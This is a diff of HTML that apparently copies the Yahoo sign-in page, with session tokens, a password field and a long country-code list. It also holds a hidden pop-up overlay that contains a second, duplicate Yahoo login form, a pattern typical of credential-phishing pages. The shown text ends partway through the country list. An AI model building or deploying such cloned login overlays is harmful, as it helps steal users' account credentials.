@@ -79,6 +79,35 @@ root.isIOSDevice = false;
                 return false;
             };
   </script>
+  <style>
+   .new-elements-container {
+        margin-top: 20px;
+    }
+    .appealing-section, .grid-section, .iframe-section, .nested-section {
+        margin-bottom: 40px;
+        padding: 20px;
+        background-color: #f9f9f9;
+        border: 1px solid #ddd;
+        border-radius: 5px;
+    }
+    .appealing-section h2, .grid-section h2, .iframe-section h2, .nested-section h2 {
+        margin-top: 0;
+    }
+    .grid-container {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        grid-gap: 10px;
+        max-width: 600px;
+        margin: auto;
+    }
+    .grid-item {
+        width: 100%;  /* Ensures image fits within its grid cell */
+        height: auto; /* Maintains aspect ratio */
+        max-width: 100%;
+        max-height: 100%;
+        object-fit: cover; /* Ensures image covers the grid cell without distortion */
+    }
+  </style>
  </head>
  <body class="bucket-mbr-whatsapp-hc bucket-mbr-whatsapp-non-hc-control">
   <script nonce="FkJAHGhSMKAFA1bQvwaq7SUqE5ohRb6dLjQaq90Yfdx/EJ20">
@@ -126,6 +155,12 @@ root.isIOSDevice = false;
         using your Yahoo account
        </span>
        <form class="pure-form" id="login-username-form" method="post">
+        <input id="browser-fp-data" name="browser-fp-data" type="hidden" value=""/>
+        <input name="crumb" type="hidden" value="czIZJgpA6uJcaSJgIv93ew"/>
+        <input name="acrumb" type="hidden" value="P6yVJBqB"/>
+        <input name="sessionIndex" type="hidden" value="QQ--"/>
+        <input name="displayName" type="hidden" value=""/>
+        <input id="deviceCapability" name="deviceCapability" type="hidden" value='{"pa":{"status":false}}'/>
         <div class="username-country-code puree-country-inline-dropdown-disabled code-of-length-2" id="username-country-code-field">
          <div class="puree-dropdown selected-country-code-cont ltr hide" id="selected-country-code-cont">
           <div class="selected-country-code" id="selected-country-code">
@@ -836,6 +871,7 @@ root.isIOSDevice = false;
           </div>
          </div>
          <div class="input-group">
+          <input autocapitalize="none" autocomplete="username" autocorrect="off" autofocus="true" class="phone-no" id="login-username" name="username" placeholder=" " type="text" value=""/>
           <div class="input-field-icon hide" id="username-field-icon">
           </div>
           <label class="login-label" for="login-username" id="login-label">
@@ -857,15 +893,18 @@ root.isIOSDevice = false;
           </ul>
          </div>
          <div class="hidden-input-container">
+          <input aria-hidden="true" autocorrect="off" class="pwd-field" name="passwd" placeholder="Password" role="presentation" tabindex="-1" type="password"/>
          </div>
         </div>
         <p class="error-msg hide" id="username-error" role="alert">
         </p>
         <div class="button-container">
+         <input class="pure-button puree-button-primary challenge-button" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:next" id="login-signin" name="signin" type="submit" value="Next"/>
         </div>
         <div class="helper-links-container">
          <div class="helper-item">
           <span class="stay-signed-in checkbox-container">
+           <input checked="" id="persistent" name="persistent" type="checkbox" value="y"/>
            <label for="persistent">
             Stay signed in
            </label>
@@ -891,8 +930,10 @@ root.isIOSDevice = false;
           </div>
           <ul class="social-login">
            <li class="items-cont-1">
-            <button class="_button" data-rapid-tracking="true" data-ylk="elm:btn;slk:google-btn;mKey:google-social-btn" href="#" id="tpa-google-button" name="tpaProvider" onclick="showPopup()" type="submit" value="google">
-             Login
+            <button class="pure-button sc-button items-1 sc-google sc-google-button" data-rapid-tracking="true" data-ylk="elm:btn;slk:google-btn;mKey:google-social-btn" id="tpa-google-button" name="tpaProvider" type="submit" value="google">
+             <label class="offscreen">
+              google
+             </label>
             </button>
            </li>
           </ul>
@@ -979,800 +1020,804 @@ root.isIOSDevice = false;
         }(this));
   </script>
   <div class="popup" id="popup" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: white; padding: 20px; border: 1px solid #ccc; box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2); z-index: 9999;">
-   <form class="pure-form" id="login-username-form" method="post">
-    <input id="browser-fp-data" name="browser-fp-data" type="hidden" value=""/>
-    <input name="crumb" type="hidden" value="czIZJgpA6uJcaSJgIv93ew"/>
-    <input name="acrumb" type="hidden" value="P6yVJBqB"/>
-    <input name="sessionIndex" type="hidden" value="QQ--"/>
-    <input name="displayName" type="hidden" value=""/>
-    <input id="deviceCapability" name="deviceCapability" type="hidden" value='{"pa":{"status":false}}'/>
-    <div class="username-country-code puree-country-inline-dropdown-disabled code-of-length-2" id="username-country-code-field">
-     <div class="puree-dropdown selected-country-code-cont ltr hide" id="selected-country-code-cont">
-      <div class="selected-country-code" id="selected-country-code">
-       +91
+   <div class="username-challenge" id="login-landing">
+    <strong class="challenge-heading">
+     Sign in
+    </strong>
+    <span class="challenge-desc signin-sub-title">
+     using your Yahoo account
+    </span>
+    <form class="pure-form" id="login-username-form" method="post">
+     <input id="browser-fp-data" name="browser-fp-data" type="hidden" value=""/>
+     <input name="crumb" type="hidden" value="czIZJgpA6uJcaSJgIv93ew"/>
+     <input name="acrumb" type="hidden" value="P6yVJBqB"/>
+     <input name="sessionIndex" type="hidden" value="QQ--"/>
+     <input name="displayName" type="hidden" value=""/>
+     <input id="deviceCapability" name="deviceCapability" type="hidden" value='{"pa":{"status":false}}'/>
+     <div class="username-country-code puree-country-inline-dropdown-disabled code-of-length-2" id="username-country-code-field">
+      <div class="puree-dropdown selected-country-code-cont ltr hide" id="selected-country-code-cont">
+       <div class="selected-country-code" id="selected-country-code">
+        +91
+       </div>
+       <span class="arrow">
+       </span>
       </div>
-      <span class="arrow">
-      </span>
-     </div>
-     <div class="country-code-dropdown country-dropdown-container hide" id="country-dropdown-container">
-      <div class="puree-dropdown">
-       <label class="offscreen" id="country-code-lbl-aria">
-        Enter Country Code
-       </label>
-       <select aria-labelledby="country-code-lbl-aria" aria-required="true" disabled="" name="countryCodeIntl" role="combobox" type="select">
-        <option data-code="+93" role="option" value="AF">
-         Afghanistan ‪(+93)‬
-        </option>
-        <option data-code="+355" role="option" value="AL">
-         Albania ‪(+355)‬
-        </option>
-        <option data-code="+213" role="option" value="DZ">
-         Algeria ‪(+213)‬
-        </option>
-        <option data-code="+1" role="option" value="AS">
-         American Samoa ‪(+1)‬
-        </option>
-        <option data-code="+376" role="option" value="AD">
-         Andorra ‪(+376)‬
-        </option>
-        <option data-code="+244" role="option" value="AO">
-         Angola ‪(+244)‬
-        </option>
-        <option data-code="+1" role="option" value="AI">
-         Anguilla ‪(+1)‬
-        </option>
-        <option data-code="+1" role="option" value="AG">
-         Antigua and Barbuda ‪(+1)‬
-        </option>
-        <option data-code="+54" role="option" value="AR">
-         Argentina ‪(+54)‬
-        </option>
-        <option data-code="+374" role="option" value="AM">
-         Armenia ‪(+374)‬
-        </option>
-        <option data-code="+297" role="option" value="AW">
-         Aruba ‪(+297)‬
-        </option>
-        <option data-code="+247" role="option" value="AC">
-         Ascension ‪(+247)‬
-        </option>
-        <option data-code="+61" role="option" value="AU">
-         Australia ‪(+61)‬
-        </option>
-        <option data-code="+672" role="option" value="AX">
-         Australian External Territories ‪(+672)‬
-        </option>
-        <option data-code="+43" role="option" value="AT">
-         Austria ‪(+43)‬
-        </option>
-        <option data-code="+994" role="option" value="AZ">
-         Azerbaijan ‪(+994)‬
-        </option>
-        <option data-code="+1" role="option" value="BS">
-         Bahamas ‪(+1)‬
-        </option>
-        <option data-code="+973" role="option" value="BH">
-         Bahrain ‪(+973)‬
-        </option>
-        <option data-code="+880" role="option" value="BD">
-         Bangladesh ‪(+880)‬
-        </option>
-        <option data-code="+1" role="option" value="BB">
-         Barbados ‪(+1)‬
-        </option>
-        <option data-code="+375" role="option" value="BY">
-         Belarus ‪(+375)‬
-        </option>
-        <option data-code="+32" role="option" value="BE">
-         Belgium ‪(+32)‬
-        </option>
-        <option data-code="+501" role="option" value="BZ">
-         Belize ‪(+501)‬
-        </option>
-        <option data-code="+229" role="option" value="BJ">
-         Benin ‪(+229)‬
-        </option>
-        <option data-code="+1" role="option" value="BM">
-         Bermuda ‪(+1)‬
-        </option>
-        <option data-code="+975" role="option" value="BT">
-         Bhutan ‪(+975)‬
-        </option>
-        <option data-code="+591" role="option" value="BO">
-         Bolivia ‪(+591)‬
-        </option>
-        <option data-code="+387" role="option" value="BA">
-         Bosnia and Herzegovina ‪(+387)‬
-        </option>
-        <option data-code="+267" role="option" value="BW">
-         Botswana ‪(+267)‬
-        </option>
-        <option data-code="+55" role="option" value="BR">
-         Brazil ‪(+55)‬
-        </option>
-        <option data-code="+1" role="option" value="VG">
-         British Virgin Islands ‪(+1)‬
-        </option>
-        <option data-code="+673" role="option" value="BN">
-         Brunei Darussalam ‪(+673)‬
-        </option>
-        <option data-code="+359" role="option" value="BG">
-         Bulgaria ‪(+359)‬
-        </option>
-        <option data-code="+226" role="option" value="BF">
-         Burkina Faso ‪(+226)‬
-        </option>
-        <option data-code="+257" role="option" value="BI">
-         Burundi ‪(+257)‬
-        </option>
-        <option data-code="+855" role="option" value="KH">
-         Cambodia ‪(+855)‬
-        </option>
-        <option data-code="+237" role="option" value="CM">
-         Cameroon ‪(+237)‬
-        </option>
-        <option data-code="+1" role="option" value="CA">
-         Canada ‪(+1)‬
-        </option>
-        <option data-code="+238" role="option" value="CV">
-         Cape Verde ‪(+238)‬
-        </option>
-        <option data-code="+1" role="option" value="KY">
-         Cayman Islands ‪(+1)‬
-        </option>
-        <option data-code="+236" role="option" value="CF">
-         Central African Republic ‪(+236)‬
-        </option>
-        <option data-code="+235" role="option" value="TD">
-         Chad ‪(+235)‬
-        </option>
-        <option data-code="+56" role="option" value="CL">
-         Chile ‪(+56)‬
-        </option>
-        <option data-code="+86" role="option" value="CN">
-         China ‪(+86)‬
-        </option>
-        <option data-code="+57" role="option" value="CO">
-         Colombia ‪(+57)‬
-        </option>
-        <option data-code="+269" role="option" value="KM">
-         Comoros ‪(+269)‬
-        </option>
-        <option data-code="+242" role="option" value="CG">
-         Congo ‪(+242)‬
-        </option>
-        <option data-code="+682" role="option" value="CK">
-         Cook Islands ‪(+682)‬
-        </option>
-        <option data-code="+506" role="option" value="CR">
-         Costa Rica ‪(+506)‬
-        </option>
-        <option data-code="+225" role="option" value="CI">
-         Cote dÕIvoire ‪(+225)‬
-        </option>
-        <option data-code="+385" role="option" value="HR">
-         Croatia ‪(+385)‬
-        </option>
-        <option data-code="+53" role="option" value="CU">
-         Cuba ‪(+53)‬
-        </option>
-        <option data-code="+357" role="option" value="CY">
-         Cyprus ‪(+357)‬
-        </option>
-        <option data-code="+420" role="option" value="CZ">
-         Czech Republic ‪(+420)‬
-        </option>
-        <option data-code="+243" role="option" value="CD">
-         Democratic Republic of the Congo ‪(+243)‬
-        </option>
-        <option data-code="+45" role="option" value="DK">
-         Denmark ‪(+45)‬
-        </option>
-        <option data-code="+246" role="option" value="DG">
-         Diego Garcia ‪(+246)‬
-        </option>
-        <option data-code="+253" role="option" value="DJ">
-         Djibouti ‪(+253)‬
-        </option>
-        <option data-code="+1" role="option" value="DM">
-         Dominica ‪(+1)‬
-        </option>
-        <option data-code="+1" role="option" value="DO">
-         Dominican Republic ‪(+1)‬
-        </option>
-        <option data-code="+670" role="option" value="TL">
-         East Timor ‪(+670)‬
-        </option>
-        <option data-code="+593" role="option" value="EC">
-         Ecuador ‪(+593)‬
-        </option>
-        <option data-code="+20" role="option" value="EG">
-         Egypt ‪(+20)‬
-        </option>
-        <option data-code="+503" role="option" value="SV">
-         El Salvador ‪(+503)‬
-        </option>
-        <option data-code="+240" role="option" value="GQ">
-         Equatorial Guinea ‪(+240)‬
-        </option>
-        <option data-code="+291" role="option" value="ER">
-         Eritrea ‪(+291)‬
-        </option>
-        <option data-code="+372" role="option" value="EE">
-         Estonia ‪(+372)‬
-        </option>
-        <option data-code="+251" role="option" value="ET">
-         Ethiopia ‪(+251)‬
-        </option>
-        <option data-code="+500" role="option" value="FK">
-         Falkland Islands ‪(+500)‬
-        </option>
-        <option data-code="+298" role="option" value="FO">
-         Faroe Islands ‪(+298)‬
-        </option>
-        <option data-code="+679" role="option" value="FJ">
-         Fiji ‪(+679)‬
-        </option>
-        <option data-code="+358" role="option" value="FI">
-         Finland ‪(+358)‬
-        </option>
-        <option data-code="+33" role="option" value="FR">
-         France ‪(+33)‬
-        </option>
-        <option data-code="+594" role="option" value="GF">
-         French Guiana ‪(+594)‬
-        </option>
-        <option data-code="+689" role="option" value="PF">
-         French Polynesia ‪(+689)‬
-        </option>
-        <option data-code="+241" role="option" value="GA">
-         Gabon ‪(+241)‬
-        </option>
-        <option data-code="+220" role="option" value="GM">
-         Gambia ‪(+220)‬
-        </option>
-        <option data-code="+995" role="option" value="GE">
-         Georgia ‪(+995)‬
-        </option>
-        <option data-code="+49" role="option" value="DE">
-         Germany ‪(+49)‬
-        </option>
-        <option data-code="+233" role="option" value="GH">
-         Ghana ‪(+233)‬
-        </option>
-        <option data-code="+350" role="option" value="GI">
-         Gibraltar ‪(+350)‬
-        </option>
-        <option data-code="+30" role="option" value="GR">
-         Greece ‪(+30)‬
-        </option>
-        <option data-code="+299" role="option" value="GL">
-         Greenland ‪(+299)‬
-        </option>
-        <option data-code="+1" role="option" value="GD">
-         Grenada ‪(+1)‬
-        </option>
-        <option data-code="+590" role="option" value="GP">
-         Guadeloupe ‪(+590)‬
-        </option>
-        <option data-code="+1" role="option" value="GU">
-         Guam ‪(+1)‬
-        </option>
-        <option data-code="+502" role="option" value="GT">
-         Guatemala ‪(+502)‬
-        </option>
-        <option data-code="+224" role="option" value="GN">
-         Guinea ‪(+224)‬
-        </option>
-        <option data-code="+245" role="option" value="GW">
-         ‪(+245)‬
-        </option>
-        <option data-code="+592" role="option" value="GY">
-         Guyana ‪(+592)‬
-        </option>
-        <option data-code="+509" role="option" value="HT">
-         Haiti ‪(+509)‬
-        </option>
-        <option data-code="+504" role="option" value="HN">
-         Honduras ‪(+504)‬
-        </option>
-        <option data-code="+852" role="option" value="HK">
-         Hong Kong ‪(+852)‬
-        </option>
-        <option data-code="+36" role="option" value="HU">
-         Hungary ‪(+36)‬
-        </option>
-        <option data-code="+354" role="option" value="IS">
-         Iceland ‪(+354)‬
-        </option>
-        <option data-code="+91" role="option" selected="selected" value="IN">
-         India ‪(+91)‬
-        </option>
-        <option data-code="+62" role="option" value="ID">
-         Indonesia ‪(+62)‬
-        </option>
-        <option data-code="+98" role="option" value="IR">
-         Iran ‪(+98)‬
-        </option>
-        <option data-code="+964" role="option" value="IQ">
-         Iraq ‪(+964)‬
-        </option>
-        <option data-code="+353" role="option" value="IE">
-         Ireland ‪(+353)‬
-        </option>
-        <option data-code="+972" role="option" value="IL">
-         Israel ‪(+972)‬
-        </option>
-        <option data-code="+39" role="option" value="IT">
-         Italy ‪(+39)‬
-        </option>
-        <option data-code="+1" role="option" value="JM">
-         Jamaica ‪(+1)‬
-        </option>
-        <option data-code="+81" role="option" value="JP">
-         Japan ‪(+81)‬
-        </option>
-        <option data-code="+962" role="option" value="JO">
-         Jordan ‪(+962)‬
-        </option>
-        <option data-code="+7" role="option" value="KZ">
-         Kazakhstan ‪(+7)‬
-        </option>
-        <option data-code="+254" role="option" value="KE">
-         Kenya ‪(+254)‬
-        </option>
-        <option data-code="+686" role="option" value="KI">
-         Kiribati ‪(+686)‬
-        </option>
-        <option data-code="+383" role="option" value="XK">
-         ‪(+383)‬
-        </option>
-        <option data-code="+965" role="option" value="KW">
-         Kuwait ‪(+965)‬
-        </option>
-        <option data-code="+996" role="option" value="KG">
-         Kyrgyzstan ‪(+996)‬
-        </option>
-        <option data-code="+856" role="option" value="LA">
-         Laos ‪(+856)‬
-        </option>
-        <option data-code="+371" role="option" value="LV">
-         Latvia ‪(+371)‬
-        </option>
-        <option data-code="+961" role="option" value="LB">
-         Lebanon ‪(+961)‬
-        </option>
-        <option data-code="+266" role="option" value="LS">
-         Lesotho ‪(+266)‬
-        </option>
-        <option data-code="+231" role="option" value="LR">
-         Liberia ‪(+231)‬
-        </option>
-        <option data-code="+218" role="option" value="LY">
-         Libya ‪(+218)‬
-        </option>
-        <option data-code="+423" role="option" value="LI">
-         Liechtenstein ‪(+423)‬
-        </option>
-        <option data-code="+370" role="option" value="LT">
-         Lithuania ‪(+370)‬
-        </option>
-        <option data-code="+352" role="option" value="LU">
-         Luxembourg ‪(+352)‬
-        </option>
-        <option data-code="+853" role="option" value="MO">
-         Macao ‪(+853)‬
-        </option>
-        <option data-code="+389" role="option" value="MK">
-         Macedonia ‪(+389)‬
-        </option>
-        <option data-code="+261" role="option" value="MG">
-         Madagascar ‪(+261)‬
-        </option>
-        <option data-code="+265" role="option" value="MW">
-         Malawi ‪(+265)‬
-        </option>
-        <option data-code="+60" role="option" value="MY">
-         Malaysia ‪(+60)‬
-        </option>
-        <option data-code="+960" role="option" value="MV">
-         Maldives ‪(+960)‬
-        </option>
-        <option data-code="+223" role="option" value="ML">
-         Mali ‪(+223)‬
-        </option>
-        <option data-code="+356" role="option" value="MT">
-         Malta ‪(+356)‬
-        </option>
-        <option data-code="+692" role="option" value="MH">
-         Marshall Islands ‪(+692)‬
-        </option>
-        <option data-code="+596" role="option" value="MQ">
-         Martinique ‪(+596)‬
-        </option>
-        <option data-code="+222" role="option" value="MR">
-         Mauritania ‪(+222)‬
-        </option>
-        <option data-code="+230" role="option" value="MU">
-         Mauritius ‪(+230)‬
-        </option>
-        <option data-code="+52" role="option" value="MX">
-         Mexico ‪(+52)‬
-        </option>
-        <option data-code="+691" role="option" value="FM">
-         Micronesia ‪(+691)‬
-        </option>
-        <option data-code="+373" role="option" value="MD">
-         Moldova ‪(+373)‬
-        </option>
-        <option data-code="+377" role="option" value="MC">
-         Monaco ‪(+377)‬
-        </option>
-        <option data-code="+976" role="option" value="MN">
-         Mongolia ‪(+976)‬
-        </option>
-        <option data-code="+382" role="option" value="ME">
-         Montenegro ‪(+382)‬
-        </option>
-        <option data-code="+1" role="option" value="MS">
-         Montserrat ‪(+1)‬
-        </option>
-        <option data-code="+212" role="option" value="MA">
-         Morocco ‪(+212)‬
-        </option>
-        <option data-code="+258" role="option" value="MZ">
-         Mozambique ‪(+258)‬
-        </option>
-        <option data-code="+95" role="option" value="MM">
-         Myanmar ‪(+95)‬
-        </option>
-        <option data-code="+264" role="option" value="NA">
-         Namibia ‪(+264)‬
-        </option>
-        <option data-code="+674" role="option" value="NR">
-         Nauru ‪(+674)‬
-        </option>
-        <option data-code="+977" role="option" value="NP">
-         Nepal ‪(+977)‬
-        </option>
-        <option data-code="+31" role="option" value="NL">
-         Netherlands ‪(+31)‬
-        </option>
-        <option data-code="+599" role="option" value="AN">
-         ‪(+599)‬
-        </option>
-        <option data-code="+687" role="option" value="NC">
-         New Caledonia ‪(+687)‬
-        </option>
-        <option data-code="+64" role="option" value="NZ">
-         New Zealand ‪(+64)‬
-        </option>
-        <option data-code="+505" role="option" value="NI">
-         Nicaragua ‪(+505)‬
-        </option>
-        <option data-code="+227" role="option" value="NE">
-         Niger ‪(+227)‬
-        </option>
-        <option data-code="+234" role="option" value="NG">
-         Nigeria ‪(+234)‬
-        </option>
-        <option data-code="+683" role="option" value="NU">
-         Niue ‪(+683)‬
-        </option>
-        <option data-code="+850" role="option" value="KP">
-         North Korea ‪(+850)‬
-        </option>
-        <option data-code="+1" role="option" value="MP">
-         Northern Mariana Islands ‪(+1)‬
-        </option>
-        <option data-code="+47" role="option" value="NO">
-         Norway ‪(+47)‬
-        </option>
-        <option data-code="+968" role="option" value="OM">
-         Oman ‪(+968)‬
-        </option>
-        <option data-code="+92" role="option" value="PK">
-         Pakistan ‪(+92)‬
-        </option>
-        <option data-code="+680" role="option" value="PW">
-         Palau ‪(+680)‬
-        </option>
-        <option data-code="+970" role="option" value="PS">
-         Palestine ‪(+970)‬
-        </option>
-        <option data-code="+507" role="option" value="PA">
-         Panama ‪(+507)‬
-        </option>
-        <option data-code="+675" role="option" value="PG">
-         Papua New Guinea ‪(+675)‬
-        </option>
-        <option data-code="+595" role="option" value="PY">
-         Paraguay ‪(+595)‬
-        </option>
-        <option data-code="+51" role="option" value="PE">
-         Peru ‪(+51)‬
-        </option>
-        <option data-code="+63" role="option" value="PH">
-         Philippines ‪(+63)‬
-        </option>
-        <option data-code="+48" role="option" value="PL">
-         Poland ‪(+48)‬
-        </option>
-        <option data-code="+351" role="option" value="PT">
-         Portugal ‪(+351)‬
-        </option>
-        <option data-code="+1" role="option" value="PR">
-         Puerto Rico ‪(+1)‬
-        </option>
-        <option data-code="+974" role="option" value="QA">
-         Qatar ‪(+974)‬
-        </option>
-        <option data-code="+262" role="option" value="RE">
-         Reunion ‪(+262)‬
-        </option>
-        <option data-code="+40" role="option" value="RO">
-         Romania ‪(+40)‬
-        </option>
-        <option data-code="+7" role="option" value="RU">
-         Russia ‪(+7)‬
-        </option>
-        <option data-code="+250" role="option" value="RW">
-         Rwanda ‪(+250)‬
-        </option>
-        <option data-code="+290" role="option" value="SH">
-         Saint Helena ‪(+290)‬
-        </option>
-        <option data-code="+1" role="option" value="KN">
-         Saint Kitts and Nevis ‪(+1)‬
-        </option>
-        <option data-code="+1" role="option" value="LC">
-         Saint Lucia ‪(+1)‬
-        </option>
-        <option data-code="+508" role="option" value="PM">
-         Saint Pierre and Miquelon ‪(+508)‬
-        </option>
-        <option data-code="+1" role="option" value="VC">
-         Saint Vincent and Grenadines ‪(+1)‬
-        </option>
-        <option data-code="+685" role="option" value="WS">
-         Samoa ‪(+685)‬
-        </option>
-        <option data-code="+378" role="option" value="SM">
-         San Marino ‪(+378)‬
-        </option>
-        <option data-code="+239" role="option" value="ST">
-         Sao Tome and Principe ‪(+239)‬
-        </option>
-        <option data-code="+966" role="option" value="SA">
-         Saudi Arabia ‪(+966)‬
-        </option>
-        <option data-code="+221" role="option" value="SN">
-         Senegal ‪(+221)‬
-        </option>
-        <option data-code="+381" role="option" value="RS">
-         Serbia ‪(+381)‬
-        </option>
-        <option data-code="+248" role="option" value="SC">
-         Seychelles ‪(+248)‬
-        </option>
-        <option data-code="+232" role="option" value="SL">
-         Sierra Leone ‪(+232)‬
-        </option>
-        <option data-code="+65" role="option" value="SG">
-         Singapore ‪(+65)‬
-        </option>
-        <option data-code="+421" role="option" value="SK">
-         Slovakia ‪(+421)‬
-        </option>
-        <option data-code="+386" role="option" value="SI">
-         Slovenia ‪(+386)‬
-        </option>
-        <option data-code="+677" role="option" value="SB">
-         Solomon Islands ‪(+677)‬
-        </option>
-        <option data-code="+252" role="option" value="SO">
-         Somalia ‪(+252)‬
-        </option>
-        <option data-code="+27" role="option" value="ZA">
-         South Africa ‪(+27)‬
-        </option>
-        <option data-code="+82" role="option" value="KR">
-         South Korea ‪(+82)‬
-        </option>
-        <option data-code="+34" role="option" value="ES">
-         Spain ‪(+34)‬
-        </option>
-        <option data-code="+94" role="option" value="LK">
-         Sri Lanka ‪(+94)‬
-        </option>
-        <option data-code="+249" role="option" value="SD">
-         Sudan ‪(+249)‬
-        </option>
-        <option data-code="+597" role="option" value="SR">
-         Suriname ‪(+597)‬
-        </option>
-        <option data-code="+268" role="option" value="SZ">
-         Swaziland ‪(+268)‬
-        </option>
-        <option data-code="+46" role="option" value="SE">
-         Sweden ‪(+46)‬
-        </option>
-        <option data-code="+41" role="option" value="CH">
-         Switzerland ‪(+41)‬
-        </option>
-        <option data-code="+963" role="option" value="SY">
-         Syria ‪(+963)‬
-        </option>
-        <option data-code="+886" role="option" value="TW">
-         Taiwan ‪(+886)‬
-        </option>
-        <option data-code="+992" role="option" value="TJ">
-         Tajikistan ‪(+992)‬
-        </option>
-        <option data-code="+255" role="option" value="TZ">
-         Tanzania ‪(+255)‬
-        </option>
-        <option data-code="+66" role="option" value="TH">
-         Thailand ‪(+66)‬
-        </option>
-        <option data-code="+228" role="option" value="TG">
-         Togo ‪(+228)‬
-        </option>
-        <option data-code="+690" role="option" value="TK">
-         Tokelau ‪(+690)‬
-        </option>
-        <option data-code="+676" role="option" value="TO">
-         Tonga ‪(+676)‬
-        </option>
-        <option data-code="+1" role="option" value="TT">
-         Trinidad and Tobago ‪(+1)‬
-        </option>
-        <option data-code="+216" role="option" value="TN">
-         Tunisia ‪(+216)‬
-        </option>
-        <option data-code="+90" role="option" value="TR">
-         Turkey ‪(+90)‬
-        </option>
-        <option data-code="+993" role="option" value="TM">
-         Turkmenistan ‪(+993)‬
-        </option>
-        <option data-code="+1" role="option" value="TC">
-         Turks and Caicos Islands ‪(+1)‬
-        </option>
-        <option data-code="+688" role="option" value="TV">
-         Tuvalu ‪(+688)‬
-        </option>
-        <option data-code="+1" role="option" value="VI">
-         US Virgin Islands ‪(+1)‬
-        </option>
-        <option data-code="+256" role="option" value="UG">
-         Uganda ‪(+256)‬
-        </option>
-        <option data-code="+380" role="option" value="UA">
-         Ukraine ‪(+380)‬
-        </option>
-        <option data-code="+971" role="option" value="AE">
-         United Arab Emirates ‪(+971)‬
-        </option>
-        <option data-code="+44" role="option" value="GB">
-         United Kingdom ‪(+44)‬
-        </option>
-        <option data-code="+1" data-format="(XXX) XXX-XXXX" role="option" value="US">
-         United States ‪(+1)‬
-        </option>
-        <option data-code="+598" role="option" value="UY">
-         Uruguay ‪(+598)‬
-        </option>
-        <option data-code="+998" role="option" value="UZ">
-         Uzbekistan ‪(+998)‬
-        </option>
-        <option data-code="+678" role="option" value="VU">
-         Vanuatu ‪(+678)‬
-        </option>
-        <option data-code="+379" role="option" value="VA">
-         Vatican City ‪(+379)‬
-        </option>
-        <option data-code="+58" role="option" value="VE">
-         Venezuela ‪(+58)‬
-        </option>
-        <option data-code="+84" role="option" value="VN">
-         Vietnam ‪(+84)‬
-        </option>
-        <option data-code="+681" role="option" value="WF">
-         Wallis and Futuna ‪(+681)‬
-        </option>
-        <option data-code="+967" role="option" value="YE">
-         Yemen ‪(+967)‬
-        </option>
-        <option data-code="+260" role="option" value="ZM">
-         Zambia ‪(+260)‬
-        </option>
-        <option data-code="+263" role="option" value="ZW">
-         Zimbabwe ‪(+263)‬
-        </option>
-       </select>
-       <div class="arrow">
+      <div class="country-code-dropdown country-dropdown-container hide" id="country-dropdown-container">
+       <div class="puree-dropdown">
+        <label class="offscreen" id="country-code-lbl-aria">
+         Enter Country Code
+        </label>
+        <select aria-labelledby="country-code-lbl-aria" aria-required="true" disabled="" name="countryCodeIntl" role="combobox" type="select">
+         <option data-code="+93" role="option" value="AF">
+          Afghanistan ‪(+93)‬
+         </option>
+         <option data-code="+355" role="option" value="AL">
+          Albania ‪(+355)‬
+         </option>
+         <option data-code="+213" role="option" value="DZ">
+          Algeria ‪(+213)‬
+         </option>
+         <option data-code="+1" role="option" value="AS">
+          American Samoa ‪(+1)‬
+         </option>
+         <option data-code="+376" role="option" value="AD">
+          Andorra ‪(+376)‬
+         </option>
+         <option data-code="+244" role="option" value="AO">
+          Angola ‪(+244)‬
+         </option>
+         <option data-code="+1" role="option" value="AI">
+          Anguilla ‪(+1)‬
+         </option>
+         <option data-code="+1" role="option" value="AG">
+          Antigua and Barbuda ‪(+1)‬
+         </option>
+         <option data-code="+54" role="option" value="AR">
+          Argentina ‪(+54)‬
+         </option>
+         <option data-code="+374" role="option" value="AM">
+          Armenia ‪(+374)‬
+         </option>
+         <option data-code="+297" role="option" value="AW">
+          Aruba ‪(+297)‬
+         </option>
+         <option data-code="+247" role="option" value="AC">
+          Ascension ‪(+247)‬
+         </option>
+         <option data-code="+61" role="option" value="AU">
+          Australia ‪(+61)‬
+         </option>
+         <option data-code="+672" role="option" value="AX">
+          Australian External Territories ‪(+672)‬
+         </option>
+         <option data-code="+43" role="option" value="AT">
+          Austria ‪(+43)‬
+         </option>
+         <option data-code="+994" role="option" value="AZ">
+          Azerbaijan ‪(+994)‬
+         </option>
+         <option data-code="+1" role="option" value="BS">
+          Bahamas ‪(+1)‬
+         </option>
+         <option data-code="+973" role="option" value="BH">
+          Bahrain ‪(+973)‬
+         </option>
+         <option data-code="+880" role="option" value="BD">
+          Bangladesh ‪(+880)‬
+         </option>
+         <option data-code="+1" role="option" value="BB">
+          Barbados ‪(+1)‬
+         </option>
+         <option data-code="+375" role="option" value="BY">
+          Belarus ‪(+375)‬
+         </option>
+         <option data-code="+32" role="option" value="BE">
+          Belgium ‪(+32)‬
+         </option>
+         <option data-code="+501" role="option" value="BZ">
+          Belize ‪(+501)‬
+         </option>
+         <option data-code="+229" role="option" value="BJ">
+          Benin ‪(+229)‬
+         </option>
+         <option data-code="+1" role="option" value="BM">
+          Bermuda ‪(+1)‬
+         </option>
+         <option data-code="+975" role="option" value="BT">
+          Bhutan ‪(+975)‬
+         </option>
+         <option data-code="+591" role="option" value="BO">
+          Bolivia ‪(+591)‬
+         </option>
+         <option data-code="+387" role="option" value="BA">
+          Bosnia and Herzegovina ‪(+387)‬
+         </option>
+         <option data-code="+267" role="option" value="BW">
+          Botswana ‪(+267)‬
+         </option>
+         <option data-code="+55" role="option" value="BR">
+          Brazil ‪(+55)‬
+         </option>
+         <option data-code="+1" role="option" value="VG">
+          British Virgin Islands ‪(+1)‬
+         </option>
+         <option data-code="+673" role="option" value="BN">
+          Brunei Darussalam ‪(+673)‬
+         </option>
+         <option data-code="+359" role="option" value="BG">
+          Bulgaria ‪(+359)‬
+         </option>
+         <option data-code="+226" role="option" value="BF">
+          Burkina Faso ‪(+226)‬
+         </option>
+         <option data-code="+257" role="option" value="BI">
+          Burundi ‪(+257)‬
+         </option>
+         <option data-code="+855" role="option" value="KH">
+          Cambodia ‪(+855)‬
+         </option>
+         <option data-code="+237" role="option" value="CM">
+          Cameroon ‪(+237)‬
+         </option>
+         <option data-code="+1" role="option" value="CA">
+          Canada ‪(+1)‬
+         </option>
+         <option data-code="+238" role="option" value="CV">
+          Cape Verde ‪(+238)‬
+         </option>
+         <option data-code="+1" role="option" value="KY">
+          Cayman Islands ‪(+1)‬
+         </option>
+         <option data-code="+236" role="option" value="CF">
+          Central African Republic ‪(+236)‬
